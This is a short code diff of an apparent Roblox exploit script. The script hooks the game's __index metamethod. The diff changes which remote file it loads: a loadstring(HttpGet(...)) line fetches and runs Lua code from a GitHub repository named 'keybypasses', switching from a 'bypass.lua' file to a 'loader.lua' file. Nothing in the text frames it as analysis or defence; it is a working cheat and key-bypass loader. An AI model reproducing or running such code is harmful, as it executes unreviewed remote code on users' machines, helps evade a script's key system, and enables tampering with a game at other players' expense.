@@ -8,4 +8,4 @@ old = hookmetamethod(game, "__index", newcclosure(function(self, k)
    return old(self, k) 
 end))
 
-loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/RiseValco/keybypasses/main/extremehub/bypass.lua"))()
+loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/RiseValco/keybypasses/main/extremehub/loader.lua"))()
